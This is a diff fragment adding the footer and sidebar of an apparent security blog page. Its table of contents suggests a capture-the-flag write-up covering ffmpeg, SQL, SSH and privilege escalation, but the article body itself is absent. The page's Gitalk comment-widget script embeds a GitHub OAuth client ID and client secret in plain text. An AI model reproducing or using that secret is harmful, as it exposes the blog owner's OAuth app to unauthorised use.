+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#recon"><span class="nav-number">1.</span> <span class="nav-text">recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exploit"><span class="nav-number">2.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ffmpeg"><span class="nav-number">2.1.</span> <span class="nav-text">ffmpeg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql"><span class="nav-number">2.2.</span> <span class="nav-text">sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH-as-alexa"><span class="nav-number">2.3.</span> <span class="nav-text">SSH as alexa</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Elevation"><span class="nav-number">3.</span> <span class="nav-text">Elevation</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">23:29</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
